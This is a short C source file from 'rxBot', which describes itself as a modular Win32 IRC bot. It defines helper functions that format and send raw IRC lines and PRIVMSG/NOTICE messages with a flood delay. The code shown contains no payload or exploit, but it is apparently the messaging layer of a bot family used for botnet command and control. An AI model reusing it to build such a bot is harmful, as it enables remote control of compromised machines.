/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

// globals
extern FILE *fp;

// irc send functions
void irc_sendv(SOCKET sock, char *msg, ...)
{
	char msgbuf[IRCLINE];

	va_list argp;
	va_start(argp, msg); 
	_vsnprintf(msgbuf, sizeof(msgbuf), msg, argp);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

	#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
	#endif

	return;
}

void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay)
{
	char msgbuf[IRCLINE], tmpbuf[IRCLINE], *action;

	if (notice) 
		action = "NOTICE"; 
	else 
		action = "PRIVMSG";

	int bufsize = IRCLINE - strlen(action) - strlen(dest) - 6 ; // trust me
	_snprintf(tmpbuf,bufsize,"%s",msg);
	sprintf(msgbuf,"%s %s :%s\r\n", action, dest, tmpbuf);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

	#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
	#endif

	if(delay)
		Sleep(FLOOD_DELAY);

	return;
}
